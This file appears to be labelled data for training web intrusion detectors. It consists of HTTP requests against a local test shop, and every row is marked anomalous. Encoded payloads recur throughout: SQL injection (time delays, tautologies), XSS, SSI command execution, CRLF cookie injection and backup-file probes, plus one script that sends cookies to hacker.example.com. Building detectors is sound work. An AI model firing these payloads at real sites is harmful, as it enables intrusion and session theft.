GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=montijo&password=LiBreta&nombre=Virtudes&apellidos=T%F3rtola+Planelles&email=arnold-weck%40santcugatpisos.gl&dni=75272191E&direccion=Av.+Mundia*l+82+%2B13*+1-F&ciudad=Guijo+de+Coria&cp=23391&provincia=Salamanca&ntc=7881123538069057&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=montijo&password=LiBreta&nombre=Virtudes&apellidos=T%F3rtola+Planelles&email=arnold-weck%40santcugatpisos.gl&dni=75272191E&direccion=Av.+Mundia*l+82+%2B13*+1-F&ciudad=Guijo+de+Coria&cp=23391&provincia=Salamanca&ntc=7881123538069057&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=montijo&passwordA=LiBreta&nombre=Virtudes&apellidos=T%F3rtola+Planelles&email=arnold-weck%40santcugatpisos.gl&dni=75272191E&direccion=Calle+San+Mambru%2C+60+&ciudad=Guijo+de+Coria&cp=23391&provincia=Salamanca&ntc=7881123538069057&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=montijo&passwordA=LiBreta&nombre=Virtudes&apellidos=T%F3rtola+Planelles&email=arnold-weck%40santcugatpisos.gl&dni=75272191E&direccion=Calle+San+Mambru%2C+60+&ciudad=Guijo+de+Coria&cp=23391&provincia=Salamanca&ntc=7881123538069057&B1=Registrar,anomalous
GET,http://localhost:8080/iissamples/ExAir/dfault.asp,,anomalous
GET,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=paros%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29,,anomalous
POST,http://localhost:8080/tienda1/publico/vaciar.jsp,B2=paros%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29,anomalous
GET,http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/vaciar.jsp,B2A=Vaciar+carrito,anomalous
GET,http://localhost:8080/tienda1.Inc,,anomalous
GET,http://localhost:8080/tienda1/asf-logo-wide.gif/,,anomalous
GET,http://localhost:8080/tienda1/miembros/asf-logo-wide.gif.OLD,,anomalous
GET,http://localhost:8080/tienda1/miembros~,,anomalous
PUT,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=jessamin&password=entera&nombre=Miy%E9n&apellidos=Agundis+Depalol&email=bonner%40926.dm&dni=22787443D&direccion=Probintzietako%2C+3+10%3FD&ciudad=Sils&cp=47686&provincia=Girona&ntc=7246879991228757&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=jessamin&password=entera&nombre=Miy%E9n&apellidos=Agundis+Depalol&email=bonner%40926.dm&dni=22787443D&direccion=Probintzietako%2C+3+10%3FD&ciudad=Sils&cp=47686+&provincia=Girona&ntc=7246879991228757&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=jessamin&password=entera&nombre=Miy%E9n&apellidos=Agundis+Depalol&email=bonner%40926.dm&dni=22787443D&direccion=Probintzietako%2C+3+10%3FD&ciudad=Sils&cp=47686+&provincia=Girona&ntc=7246879991228757&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=jessamin&password=entera&nombre=Miy%E9n&apellidos=Agundis+Depalol&email=bonner%40926.dm&dni=22787443D&direccion=Probintzietako%2C+3+10%3FD&ciudad=Sils&cp=47686&provincia=Girona&ntcA=7246879991228757&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=jessamin&password=entera&nombre=Miy%E9n&apellidos=Agundis+Depalol&email=bonner%40926.dm&dni=22787443D&direccion=Probintzietako%2C+3+10%3FD&ciudad=Sils&cp=47686&provincia=Girona&ntcA=7246879991228757&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/asf-logo-wide.gif/.INC,,anomalous
GET,http://localhost:8080/tienda1/miembros/asf-logo-wide.gif.INC,,anomalous
GET,http://localhost:8080/tienda1/imagenes/1.gif/4861362529278789730.Old,,anomalous
GET,http://localhost:8080/SmarTicketApp/index.html,,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=2%2F&nombre=Queso+Manchego&precio=85&cantidad=15&B1=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=2%2F&nombre=Queso+Manchego&precio=85&cantidad=15&B1=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Queso+Manchego&precioA=85&cantidad=15&B1=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=2&nombre=Queso+Manchego&precioA=85&cantidad=15&B1=A%F1adir+al+carrito,anomalous
PUT,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=roddie9&pwd=2esu1ador3&remember=on&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&login=roddie9&pwd=2esu1ador3&remember=on&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&login=roddie9&pwd=2esu1ador3&remember=on&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&pwd=2esu1ador3&remember=on&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&pwd=2esu1ador3&remember=on&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=foulke%2Bs&pwd=2esu1ador3&remember=on&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=foulke%2Bs&pwd=2esu1ador3&remember=on&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modoA=entrar&login=roddie9&pwd=2esu1ador3&remember=on&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modoA=entrar&login=roddie9&pwd=2esu1ador3&remember=on&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=2,,anomalous
POST,http://localhost:8080/tienda1/publico/caracteristicas.jsp,idA=2,anomalous
GET,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%27+AND+%271%27%3D%271,,anomalous
POST,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsg=Credenciales+incorrectas%27+AND+%271%27%3D%271,anomalous
GET,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas,,anomalous
POST,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsgA=Credenciales+incorrectas,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=any%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235&precio=5540&B1=Confirmar,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=any%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235&precio=5540&B1=Confirmar,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5540&B1=Confirmar%2F,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=5540&B1=Confirmar%2F,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5540&B1A=Confirmar,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=5540&B1A=Confirmar,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp/4861362529278789730,,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro+&login=carringt&password=pis7ar&nombre=Tristana&apellidos=Isart+Viva&email=rae%40ajuntamentbarcelona20.kg&dni=47182191Z&direccion=C%2F+Argullos+73%2C+9%3FA&ciudad=Figueruelas&cp=49655&provincia=A+Coru%F1a&ntc=3983167726534410&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro+&login=carringt&password=pis7ar&nombre=Tristana&apellidos=Isart+Viva&email=rae%40ajuntamentbarcelona20.kg&dni=47182191Z&direccion=C%2F+Argullos+73%2C+9%3FA&ciudad=Figueruelas&cp=49655&provincia=A+Coru%F1a&ntc=3983167726534410&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org&password=pis7ar&nombre=Tristana&apellidos=Isart+Viva&email=rae%40ajuntamentbarcelona20.kg&dni=47182191Z&direccion=C%2F+Argullos+73%2C+9%3FA&ciudad=Figueruelas&cp=49655&provincia=A+Coru%F1a&ntc=3983167726534410&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org&password=pis7ar&nombre=Tristana&apellidos=Isart+Viva&email=rae%40ajuntamentbarcelona20.kg&dni=47182191Z&direccion=C%2F+Argullos+73%2C+9%3FA&ciudad=Figueruelas&cp=49655&provincia=A+Coru%F1a&ntc=3983167726534410&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=carringt&password=pis7ar&nombre=Tristana&apellidos=Isart+Viva&email=rae%40ajuntamentbarcelona20.kg&dni=29B8528B7B0C&direccion=C%2F+Argullos+73%2C+9%3FA&ciudad=Figueruelas&cp=49655&provincia=A+Coru%F1a&ntc=3983167726534410&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=carringt&password=pis7ar&nombre=Tristana&apellidos=Isart+Viva&email=rae%40ajuntamentbarcelona20.kg&dni=29B8528B7B0C&direccion=C%2F+Argullos+73%2C+9%3FA&ciudad=Figueruelas&cp=49655&provincia=A+Coru%F1a&ntc=3983167726534410&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=carringt&password=pis7ar&nombre=Tristana&apellidos=Isart+Viva&email=rae%40ajuntamentbarcelona20.kg&dni=47182191Z&direccion=C%2F+Argullos+73%2C+9%3FA&ciudad=Figueruelas&cpA=49655&provincia=A+Coru%F1a&ntc=3983167726534410&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=carringt&password=pis7ar&nombre=Tristana&apellidos=Isart+Viva&email=rae%40ajuntamentbarcelona20.kg&dni=47182191Z&direccion=C%2F+Argullos+73%2C+9%3FA&ciudad=Figueruelas&cpA=49655&provincia=A+Coru%F1a&ntc=3983167726534410&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%22+AND+%221%22%3D%221,,anomalous
POST,http://localhost:8080/tienda1/publico/vaciar.jsp,B2=Vaciar+carrito%22+AND+%221%22%3D%221,anomalous
GET,http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/vaciar.jsp,B2A=Vaciar+carrito,anomalous
GET,http://localhost:8080/IISSamples/sdk/asp/database/SimpleQuery_VBScript.asp,,anomalous
GET,http://localhost:8080/iisadmpwd/anot3.htr,,anomalous
GET,http://localhost:8080/asf-logo-wide.gif/.bak,,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=siva0&password=eSOT%C9R2ca&nombre=Fede&apellidos=Romera+Zuleta&email=dacgnault%40ajuntamentbarcelona2-0.name&dni=34382308E&direccion=C%2F+Cuellar+177+%27INJECTED_PARAM&ciudad=Albalate+de+las+Nogueras&cp=24915&provincia=Segovia&ntc=8975566519527853&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=siva0&password=eSOT%C9R2ca&nombre=Fede&apellidos=Romera+Zuleta&email=dacgnault%40ajuntamentbarcelona2-0.name&dni=34382308E&direccion=C%2F+Cuellar+177+%27INJECTED_PARAM&ciudad=Albalate+de+las+Nogueras&cp=24915&provincia=Segovia&ntc=8975566519527853&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=ba%3Fb%2Cbie&password=eSOT%C9R2ca&nombre=Fede&apellidos=Romera+Zuleta&email=dacgnault%40ajuntamentbarcelona2-0.name&dni=34382308E&direccion=C%2F+Cuellar+177+&ciudad=Albalate+de+las+Nogueras&cp=24915&provincia=Segovia&ntc=8975566519527853&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=ba%3Fb%2Cbie&password=eSOT%C9R2ca&nombre=Fede&apellidos=Romera+Zuleta&email=dacgnault%40ajuntamentbarcelona2-0.name&dni=34382308E&direccion=C%2F+Cuellar+177+&ciudad=Albalate+de+las+Nogueras&cp=24915&provincia=Segovia&ntc=8975566519527853&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=siva0&passwordA=eSOT%C9R2ca&nombre=Fede&apellidos=Romera+Zuleta&email=dacgnault%40ajuntamentbarcelona2-0.name&dni=34382308E&direccion=C%2F+Cuellar+177+&ciudad=Albalate+de+las+Nogueras&cp=24915&provincia=Segovia&ntc=8975566519527853&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=siva0&passwordA=eSOT%C9R2ca&nombre=Fede&apellidos=Romera+Zuleta&email=dacgnault%40ajuntamentbarcelona2-0.name&dni=34382308E&direccion=C%2F+Cuellar+177+&ciudad=Albalate+de+las+Nogueras&cp=24915&provincia=Segovia&ntc=8975566519527853&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/miembros/asf-logo-wide.gif/,,anomalous
GET,http://localhost:8080/tienda1/miembros/asf-logo-wide.gif.java,,anomalous
GET,http://localhost:8080/tienda1/asf-logo-wide.gif/,,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=85&cantidad=31&B1=A%F1adir+al+carrito%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=1&nombre=Vino+Rioja&precio=85&cantidad=31&B1=A%F1adir+al+carrito%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=3%2F&nombre=Vino+Rioja&precio=85&cantidad=31&B1=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=3%2F&nombre=Vino+Rioja&precio=85&cantidad=31&B1=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombreA=Vino+Rioja&precio=85&cantidad=31&B1=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=1&nombreA=Vino+Rioja&precio=85&cantidad=31&B1=A%F1adir+al+carrito,anomalous
PUT,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=cheng&pwd=escorzo&remember=off&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=cheng&pwd=cazc%2Calear&remember=off&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=cheng&pwd=cazc%2Calear&remember=off&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modoA=entrar&login=cheng&pwd=escorzo&remember=off&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modoA=entrar&login=cheng&pwd=escorzo&remember=off&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=AND+1%3D1,,anomalous
POST,http://localhost:8080/tienda1/publico/caracteristicas.jsp,id=AND+1%3D1,anomalous
GET,http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=2,,anomalous
POST,http://localhost:8080/tienda1/publico/caracteristicas.jsp,idA=2,anomalous
GET,http://localhost:8080/webadmin.nsf,,anomalous
GET,http://localhost:8080/tienda1/publico/4861362529278789730.INC,,anomalous
GET,http://localhost:8080/examplesWebApp/WebservicesEJB.jsp,,anomalous
GET,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas,,anomalous
POST,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsgA=Credenciales+incorrectas,anomalous
PUT,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=6226&B1=Confirmar,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6226&B1=Confirmar%3F,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=6226&B1=Confirmar%3F,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6226&B1=Confirmar%2F,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=6226&B1=Confirmar%2F,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6226&B1A=Confirmar,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=6226&B1A=Confirmar,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=goldarin5%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E&password=peRVeRtiR&nombre=Lavinia&apellidos=Llecha&email=stalmaster%40fotoseroticas.com.edu&dni=50951157Q&direccion=Calle+Nancales%2C+S%2FN%2C+&ciudad=Urdazubi%2FUrdax&cp=24879&provincia=A+Coru%F1a&ntc=1870284741408418&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=goldarin5%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E&password=peRVeRtiR&nombre=Lavinia&apellidos=Llecha&email=stalmaster%40fotoseroticas.com.edu&dni=50951157Q&direccion=Calle+Nancales%2C+S%2FN%2C+&ciudad=Urdazubi%2FUrdax&cp=24879&provincia=A+Coru%F1a&ntc=1870284741408418&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=goldarin5&password=peRVeRtiR&nombre=Lavinia&apellidos=Llecha&email=stalmaster%40fotoseroticas.com.edu&dni=50951157Q&direccion=Calle+Nancales%2C+S%2FN%2C+&ciudad=Urdazubi%2FUrdax&cp=24879&provincia=A+Coru%F1a&ntcA=1870284741408418&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=goldarin5&password=peRVeRtiR&nombre=Lavinia&apellidos=Llecha&email=stalmaster%40fotoseroticas.com.edu&dni=50951157Q&direccion=Calle+Nancales%2C+S%2FN%2C+&ciudad=Urdazubi%2FUrdax&cp=24879&provincia=A+Coru%F1a&ntcA=1870284741408418&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,,anomalous
POST,http://localhost:8080/tienda1/publico/vaciar.jsp,B2=Vaciar+carrito%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,anomalous
GET,http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/vaciar.jsp,B2A=Vaciar+carrito,anomalous
GET,http://localhost:8080/tienda1/global/menum.jsp/asf-logo-wide.gif,,anomalous
GET,http://localhost:8080/tienda1/global/titulo.jsp.Inc,,anomalous
GET,http://localhost:8080/catalog.nsf,,anomalous
GET,http://localhost:8080/tienda1/miembros/index.jsp/asf-logo-wide.gif.old,,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=shutterb&password=4ntorchar&nombre=Noam&apellidos=Samper+Folco&email=menant%40venderfotografias.se&dni=33151406B&direccion=Calle+Aladierna%2C+85+3%3FA&ciudad=Buruj%F3n&cp=28648&provincia=Barcel%3Fona&ntc=1260473774275985&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=shutterb&password=4ntorchar&nombre=Noam&apellidos=Samper+Folco&email=menant%40venderfotografias.se&dni=33151406B&direccion=Calle+Aladierna%2C+85+3%3FA&ciudad=Buruj%F3n&cp=28648&provincia=Barcel%3Fona&ntc=1260473774275985&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=shutterb&password=4ntorchar&nombre=Noam&apellidos=Samper+Folco&email=menant%40venderfotografias.se&dni=33151406B&direccion=Calle+Aladierna%2C+85+3%3FA&ciudad=Buruj%F3n&cp=28648&provincia=M%E1laga&ntcA=1260473774275985&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=shutterb&password=4ntorchar&nombre=Noam&apellidos=Samper+Folco&email=menant%40venderfotografias.se&dni=33151406B&direccion=Calle+Aladierna%2C+85+3%3FA&ciudad=Buruj%F3n&cp=28648&provincia=M%E1laga&ntcA=1260473774275985&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/miembros/asf-logo-wide.gif,,anomalous
GET,http://localhost:8080/tienda1/miembros/salir.jsp/4861362529278789730~,,anomalous
GET,http://localhost:8080/theme,,anomalous
GET,http://localhost:8080/tienda1/imagenes/asf-logo-wide.inc,,anomalous
GET,http://localhost:8080/.BAK,,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=39%2F&cantidad=92&B1=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=1&nombre=Queso+Manchego&precio=39%2F&cantidad=92&B1=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombreA=Queso+Manchego&precio=85&cantidad=92&B1=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=1&nombreA=Queso+Manchego&precio=85&cantidad=92&B1=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/asf-logo-wide.gif/,,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=anabal&pwd=somn%E1mbula&remember=off%2F&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=anabal&pwd=somn%E1mbula&remember=off%2F&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=anabal&pwdA=somn%E1mbula&remember=on&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=anabal&pwdA=somn%E1mbula&remember=on&B1=Entrar,anomalous
GET,http://localhost:8080/servlet/snoop2,,anomalous
GET,http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=1,,anomalous
POST,http://localhost:8080/tienda1/publico/caracteristicas.jsp,idA=1,anomalous
GET,http://localhost:8080/tienda1/publico/caracteristicas.jsp/asf-logo-wide~,,anomalous
GET,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectassessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E,,anomalous
POST,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsg=Credenciales+incorrectassessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E,anomalous
GET,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,,anomalous
POST,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsg=%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,anomalous
GET,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas,,anomalous
POST,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsgA=Credenciales+incorrectas,anomalous
GET,http://localhost:8080/asf-logo-wide,,anomalous
GET,http://localhost:8080/iisadmpwd/aexp4.htr,,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5685any%250ASet-cookie%253A%2BTamper%253D1041264011025374727&B1=Confirmar,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=5685any%250ASet-cookie%253A%2BTamper%253D1041264011025374727&B1=Confirmar,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5685&B1=Pasar+por+caja%2F,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=5685&B1=Pasar+por+caja%2F,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modoA=insertar&precio=5685&B1=Confirmar,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modoA=insertar&precio=5685&B1=Confirmar,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=norio8&password=4l7ct4ot7pi5a&nombre=Jaen&apellidos=Alicante+Oruna&email=cumby%40blogsmegumi.ly%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&dni=01105274D&direccion=Calle+German+Monzon+Gamon%2C+46+&ciudad=Puente+la+Reina+de+Jaca&cp=08278&provincia=Ciudad+Real&ntc=3246974816793870&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=norio8&password=4l7ct4ot7pi5a&nombre=Jaen&apellidos=Alicante+Oruna&email=cumby%40blogsmegumi.ly%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&dni=01105274D&direccion=Calle+German+Monzon+Gamon%2C+46+&ciudad=Puente+la+Reina+de+Jaca&cp=08278&provincia=Ciudad+Real&ntc=3246974816793870&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=te%3Fruo6&password=4l7ct4ot7pi5a&nombre=Jaen&apellidos=Alicante+Oruna&email=cumby%40blogsmegumi.ly&dni=01105274D&direccion=Calle+German+Monzon+Gamon%2C+46+&ciudad=Puente+la+Reina+de+Jaca&cp=08278&provincia=Ciudad+Real&ntc=3246974816793870&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=te%3Fruo6&password=4l7ct4ot7pi5a&nombre=Jaen&apellidos=Alicante+Oruna&email=cumby%40blogsmegumi.ly&dni=01105274D&direccion=Calle+German+Monzon+Gamon%2C+46+&ciudad=Puente+la+Reina+de+Jaca&cp=08278&provincia=Ciudad+Real&ntc=3246974816793870&B1=Registrar,anomalous
